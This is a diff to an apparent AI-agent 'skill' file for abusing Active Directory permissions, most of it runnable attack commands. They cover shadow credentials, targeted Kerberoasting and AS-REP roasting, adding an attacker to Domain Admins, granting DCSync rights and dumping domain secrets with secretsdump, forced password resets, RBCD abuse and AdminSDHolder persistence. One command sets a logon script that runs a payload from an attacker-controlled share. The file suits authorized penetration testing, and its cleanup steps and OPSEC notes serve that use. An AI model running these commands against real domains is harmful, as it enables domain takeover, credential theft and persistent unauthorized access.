@@ -98,12 +98,17 @@ and records state changes. Your return summary must include:
 
 **Kerberos-first workflow**:
 ```bash
-getTGT.py DOMAIN/user -hashes :NTHASH
+cd $TMPDIR && getTGT.py DOMAIN/user -hashes :NTHASH -dc-ip DC_IP
 # or with password
-getTGT.py DOMAIN/user:'Password123!'
-export KRB5CCNAME=user.ccache
+cd $TMPDIR && getTGT.py DOMAIN/user:'Password123!' -dc-ip DC_IP
+export KRB5CCNAME=$TMPDIR/user.ccache
 # All subsequent commands use -k -no-pass or equivalent
 ```
+
+**Tool output directory**: `getTGT.py`, `certipy shadow`, and
+`bloodyAD add shadowCredentials` write output files to CWD. Always prefix with
+`cd $TMPDIR &&`. `getTGT.py` does NOT support `-out`. When saving evidence, use
+`mv` (not `cp`) to avoid stray duplicates.
 
 ## Step 1: Enumerate Exploitable ACLs
 
@@ -113,18 +118,18 @@ Skip if BloodHound or **ad-discovery** already identified the path.
 
 ```bash
 # Find objects you can write to
-bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL get writable \
+bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL --dc-ip DC_IP get writable \
   --otype USER --right WRITE --detail
 
-bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL get writable \
+bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL --dc-ip DC_IP get writable \
   --otype GROUP --right WRITE --detail
 
-bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL get writable \
+bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL --dc-ip DC_IP get writable \
   --otype COMPUTER --right WRITE --detail
 
 # Check specific object
-bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL get object targetuser \
-  --attr nTSecurityDescriptor --resolve-sd
+bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL --dc-ip DC_IP get object \
+  targetuser --attr nTSecurityDescriptor --resolve-sd
 ```
 
 ### PowerView (Windows)
@@ -176,18 +181,18 @@ authenticate via PKINIT. No password change, pure Kerberos.
 **Requirements**: DC is Windows Server 2016+, AD CS configured, PKINIT enabled.
 
 ```bash
-# pywhisker — add shadow credential
-pywhisker.py -d DOMAIN.LOCAL -u attacker -k --no-pass \
+# bloodyAD — add shadow credential (preferred, most commonly installed)
+cd $TMPDIR && bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL \
+  --dc-ip DC_IP add shadowCredentials targetuser
+# Output: PFX file + password + NT hash
+
+# Alternative: pywhisker
+cd $TMPDIR && pywhisker.py -d DOMAIN.LOCAL -u attacker -k --no-pass \
   --target targetuser --action add --filename targetuser_cert
 # Output: PFX file path + password + DeviceID (save for cleanup)
 
-# Alternative: bloodyAD
-bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL \
-  add shadowCredentials targetuser
-# Output: PFX file + password
-
 # Alternative: Certipy (full automation — adds cred + gets TGT)
-certipy shadow auto -account targetuser -dc-ip DC_IP -k -no-pass \
+cd $TMPDIR && certipy shadow auto -account targetuser -dc-ip DC_IP -k -no-pass \
   -target DC.DOMAIN.LOCAL
 ```
 
@@ -222,12 +227,13 @@ wmiexec.py -k -no-pass DOMAIN/Administrator@TARGET.DOMAIN.LOCAL
 
 **Cleanup (critical)**:
 ```bash
+# bloodyAD (preferred)
+bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL --dc-ip DC_IP \
+  remove shadowCredentials targetuser --key KEY_ID
+
+# Or pywhisker
 pywhisker.py -d DOMAIN.LOCAL -u attacker -k --no-pass \
   --target targetuser --action remove --device-id DEVICE_ID
-
-# Or bloodyAD
-bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL \
-  remove shadowCredentials targetuser --key KEY_ID
 
 # Verify removal
 pywhisker.py -d DOMAIN.LOCAL -u attacker -k --no-pass \
@@ -240,12 +246,12 @@ Set an SPN on the target user, request a TGS, crack it offline, remove the SPN.
 
 ```bash
 # Check current SPNs (should be empty for regular users)
-bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL get object targetuser \
-  --attr serviceprincipalname
+bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL --dc-ip DC_IP get object \
+  targetuser --attr serviceprincipalname
 
 # Set SPN
-bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL set object targetuser \
-  serviceprincipalname -v 'ops/whatever1'
+bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL --dc-ip DC_IP set object \
+  targetuser serviceprincipalname -v 'ops/whatever1'
 
 # Extract TGS
 GetUserSPNs.py DOMAIN/attacker -k -no-pass -request-user targetuser
@@ -254,8 +260,8 @@ GetUserSPNs.py DOMAIN/attacker -k -no-pass -request-user targetuser
 hashcat -m 13100 tgs_hash.txt wordlist.txt
 
 # Remove SPN immediately (cleanup)
-bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL set object targetuser \
-  serviceprincipalname
+bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL --dc-ip DC_IP set object \
+  targetuser serviceprincipalname
 ```
 
 ```powershell
@@ -272,8 +278,8 @@ Remove SPN immediately after TGS extraction.
 
 ```bash
 # Disable Kerberos pre-authentication
-bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL add uac targetuser \
-  -f DONT_REQ_PREAUTH
+bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL --dc-ip DC_IP add uac \
+  targetuser -f DONT_REQ_PREAUTH
 
 # Get AS-REP hash
 GetNPUsers.py DOMAIN/targetuser -format hashcat -outputfile asrep.txt -k -no-pass
@@ -282,8 +288,8 @@ GetNPUsers.py DOMAIN/targetuser -format hashcat -outputfile asrep.txt -k -no-pas
 hashcat -m 18200 asrep.txt wordlist.txt
 
 # Restore pre-auth (cleanup)
-bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL remove uac targetuser \
-  -f DONT_REQ_PREAUTH
+bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL --dc-ip DC_IP remove uac \
+  targetuser -f DONT_REQ_PREAUTH
 ```
 
 **OPSEC**: Medium — UAC change logged as Event 5136. Disabled pre-auth is
@@ -293,12 +299,12 @@ unusual and may trigger alerts.
 
 ```bash
 # Set logon script (executes at user's next logon)
-bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL set object targetuser \
-  scriptpath -v '\\ATTACKER_IP\share\payload.bat'
+bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL --dc-ip DC_IP set object \
+  targetuser scriptpath -v '\\ATTACKER_IP\share\payload.bat'
 
 # Cleanup
-bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL set object targetuser \
-  scriptpath -v ''
+bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL --dc-ip DC_IP set object \
+  targetuser scriptpath -v ''
 ```
 
 **OPSEC**: Medium-High — requires user logon, script path visible in AD.
@@ -309,16 +315,16 @@ Add yourself (or a controlled user) to a privileged group.
 
 ```bash
 # bloodyAD
-bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL add groupMember \
-  'Domain Admins' attacker
+bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL --dc-ip DC_IP \
+  add groupMember 'Domain Admins' attacker
 
 # Verify
-bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL get groupMember \
-  'Domain Admins'
+bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL --dc-ip DC_IP \
+  get groupMember 'Domain Admins'
 
 # Cleanup
-bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL remove groupMember \
-  'Domain Admins' attacker
+bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL --dc-ip DC_IP \
+  remove groupMember 'Domain Admins' attacker
 ```
 
 ```powershell
@@ -340,7 +346,7 @@ Grant yourself additional permissions on the target object.
 
 ```bash
 # Grant DCSync rights (Replicating Directory Changes + All)
-bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL add dcsync attacker
+bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL --dc-ip DC_IP add dcsync attacker
 
 # Or with dacledit.py
 dacledit.py -action write -rights DCSync -principal attacker \
@@ -350,20 +356,20 @@ dacledit.py -action write -rights DCSync -principal attacker \
 secretsdump.py -k -no-pass DOMAIN/attacker@DC.DOMAIN.LOCAL -just-dc
 
 # Cleanup — remove DCSync rights
-bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL remove dcsync attacker
+bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL --dc-ip DC_IP remove dcsync attacker
 ```
 
 ### WriteDACL on Group/User → GenericAll
 
 ```bash
 # Grant GenericAll on group
-bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL add genericAll \
+bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL --dc-ip DC_IP add genericAll \
   'CN=Domain Admins,CN=Users,DC=DOMAIN,DC=LOCAL' attacker
 
 # Now you have GenericAll — proceed to Step 3 (group) or Step 2 (user)
 
 # Cleanup
-bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL remove genericAll \
+bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL --dc-ip DC_IP remove genericAll \
   'CN=Domain Admins,CN=Users,DC=DOMAIN,DC=LOCAL' attacker
 ```
 
@@ -394,20 +400,21 @@ Take ownership of an object, then modify its DACL.
 
 ```bash
 # Step 1: Change owner to yourself
-bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL set owner targetobject attacker
+bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL --dc-ip DC_IP \
+  set owner targetobject attacker
 
 # Step 2: As owner, grant yourself GenericAll
-bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL add genericAll \
-  targetobject attacker
+bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL --dc-ip DC_IP \
+  add genericAll targetobject attacker
 
 # Step 3: Exploit (password reset, shadow creds, group add, etc.)
 # ... use techniques from Step 2 or Step 3
 
 # Cleanup: restore original owner and remove ACL
-bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL remove genericAll \
-  targetobject attacker
-bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL set owner \
-  targetobject original_owner
+bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL --dc-ip DC_IP \
+  remove genericAll targetobject attacker
+bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL --dc-ip DC_IP \
+  set owner targetobject original_owner
 ```
 
 ```powershell
@@ -427,8 +434,8 @@ the user will be locked out of their account.
 
 ```bash
 # bloodyAD
-bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL set password targetuser \
-  'NewP@ssw0rd!'
+bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL --dc-ip DC_IP set password \
+  targetuser 'NewP@ssw0rd!'
 
 # rpcclient
 rpcclient -U 'attacker%password' DC_IP \
@@ -456,7 +463,7 @@ addcomputer.py -computer-name 'FAKECOMP$' -computer-pass 'P@ssw0rd!' \
   DOMAIN/attacker -k -no-pass
 
 # Set RBCD
-bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL add rbcd 'TARGET$' 'FAKECOMP$'
+bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL --dc-ip DC_IP add rbcd 'TARGET$' 'FAKECOMP$'
 
 # S4U attack — see kerberos-delegation skill for full chain
 getST.py -spn cifs/TARGET.DOMAIN.LOCAL -impersonate Administrator \
@@ -466,7 +473,7 @@ export KRB5CCNAME=Administrator.ccache
 secretsdump.py -k -no-pass DOMAIN/Administrator@TARGET.DOMAIN.LOCAL
 
 # Cleanup
-bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL remove rbcd 'TARGET$' 'FAKECOMP$'
+bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL --dc-ip DC_IP remove rbcd 'TARGET$' 'FAKECOMP$'
 ```
 
 Route to **kerberos-delegation** (Step 4) for the full RBCD exploitation chain.
@@ -482,7 +489,7 @@ to all privileged accounts.
 
 ```bash
 # Add GenericAll for attacker on AdminSDHolder
-bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL add genericAll \
+bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL --dc-ip DC_IP add genericAll \
   'CN=AdminSDHolder,CN=System,DC=DOMAIN,DC=LOCAL' attacker
 
 # Wait for SDProp (60 minutes by default) or force it:
@@ -495,7 +502,7 @@ ldifde -i -f sdprop.ldf  # LDAP modification to trigger SDProp
 # This persists across password changes, group modifications, etc.
 
 # Cleanup
-bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL remove genericAll \
+bloodyAD -d DOMAIN.LOCAL -k --host DC.DOMAIN.LOCAL --dc-ip DC_IP remove genericAll \
   'CN=AdminSDHolder,CN=System,DC=DOMAIN,DC=LOCAL' attacker
 # Note: cleanup won't propagate until next SDProp cycle
 ```
@@ -592,6 +599,25 @@ If no CA exists, fall back to targeted Kerberoasting (Option B).
 - Ensure `-k` flag is present for Kerberos auth
 - Verify `KRB5CCNAME` points to a valid ccache
 - Try `--host DC_FQDN` (not IP) for Kerberos name resolution
+- **Always include `--dc-ip DC_IP`** when using Kerberos auth — DNS resolution
+  failures are common in lab environments and cause bloodyAD to hang or error.
+  All bloodyAD Kerberos commands should use:
+  `bloodyAD -d DOMAIN -k --host DC.DOMAIN.LOCAL --dc-ip DC_IP ...`
+
+### Shadow Credentials: S4U ccache cannot write to other objects
+
+Shadow credential authentication produces an S4U service ticket (not a full
+TGT). This ticket has limited scope — it authenticates for the target account
+but may fail for LDAP writes against *other* AD objects. If you need to chain
+shadow credentials to modify a second account:
+
+```bash
+# Don't use the shadow credential ccache for the second target
+# Instead, get a proper TGT using the NT hash from shadow creds
+cd $TMPDIR && getTGT.py DOMAIN/compromised_user -hashes :NTHASH -dc-ip DC_IP
+export KRB5CCNAME=$TMPDIR/compromised_user.ccache
+# Now this TGT works for LDAP writes against any object
+```
 
 ### KRB_AP_ERR_SKEW (Clock Skew)
 
